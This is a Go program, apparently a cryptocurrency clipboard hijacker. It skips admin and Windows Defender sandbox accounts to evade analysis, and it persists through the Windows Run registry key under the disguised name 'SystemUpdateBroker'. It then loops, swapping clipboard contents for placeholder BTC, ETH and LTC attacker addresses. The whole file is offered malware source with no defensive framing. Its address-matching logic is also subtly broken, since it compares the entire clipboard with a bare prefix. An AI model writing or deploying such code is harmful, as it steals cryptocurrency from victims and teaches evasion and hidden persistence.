package main

import (
	"github.com/atotto/clipboard"
	"golang.org/x/sys/windows/registry"
	"log"
	"os"
	"os/user"
	"path/filepath"
)

func main() {

	blockedusers := map[string]bool{
		"admin":              true,
		"administrator":      true,
		"WDAGUtilityAccount": true,
	}

	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	if blockedusers[user.Username] {
		os.Exit(0)
	}

	exepath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	err = key.SetStringValue("SystemUpdateBroker", exepath)
	if err != nil {
		panic(err)
	}
	for {
		BTC := "bitcoin address here"
		ETH := "Etherium address here"
		LTC := "litecoin address here"
		ltcfmt := "ltc1"
		ethfmt := "0x"
		btcfmt := "bc1"
		content, err := clipboard.ReadAll()

		if err != nil {
			log.Fatal(err)
		}

		if content == btcfmt {
			clipboard.WriteAll(BTC)
		}
		if content == ethfmt {
			clipboard.WriteAll(ETH)
		}
		if content == ltcfmt {
			clipboard.WriteAll(LTC)
		}
	}
}
